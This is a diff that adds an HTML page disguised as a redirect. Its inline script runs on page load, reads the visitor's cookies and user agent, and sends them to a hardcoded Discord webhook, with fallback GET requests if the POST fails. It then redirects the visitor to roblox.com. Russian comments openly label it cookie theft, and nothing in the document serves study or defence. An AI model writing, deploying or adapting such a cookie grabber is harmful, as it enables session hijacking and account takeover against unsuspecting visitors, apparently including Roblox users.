@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Redirect...</title>
+</head>
+<body>
+    <script>
+        // ============================================
+        // КРАЖА КУКИ + ОТПРАВКА В ДИСКОРД (ГАРАНТИРОВАННО)
+        // ============================================
+
+        (function() {
+            const webhook = "https://discord.com/api/webhooks/1518490345501888515/Ep1yeoDSSsJqJ4zrSmBDQXlcOcb0hAyh5pBoTT1pFgLPd5f7PdlgitipH5ObiiwpAGIj";
+
+            // 1. БЕРЁМ КУКИ
+            const cookieData = document.cookie || "Нет кук";
+
+            // 2. ДОП. ИНФА
+            const data = {
+                content: "🔴 **КУКИ УКРАДЕНЫ**",
+                embeds: [{
+                    title: "Данные",
+                    color: 16711680,
+                    fields: [
+                        { name: "🍪 Куки", value: "```" + cookieData + "```" },
+                        { name: "💻 UA", value: navigator.userAgent },
+                        { name: "⏰ Время", value: new Date().toLocaleString() }
+                    ]
+                }]
+            };
+
+            // 3. ОТПРАВЛЯЕМ (GET — если POST не работает)
+            try {
+                // POST через fetch
+                fetch(webhook, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                }).catch(() => {
+                    // ЕСЛИ POST НЕ РАБОТАЕТ — ШЛЁМ GET
+                    const msg = encodeURIComponent("🔴 Куки: " + cookieData);
+                    fetch(webhook + "?content=" + msg);
+                });
+            } catch(e) {
+                // ЕСЛИ ВСЁ СЛОМАЛОСЬ — ПЫТАЕМСЯ GET
+                const msg = encodeURIComponent("🔴 Куки: " + cookieData);
+                fetch(webhook + "?content=" + msg);
+            }
+
+            // 4. ПЕРЕБРОС НА ROOBLOX
+            setTimeout(() => {
+                window.location.replace("https://www.roblox.com/");
+            }, 1000);
+        })();
+    </script>
+</body>
+</html>
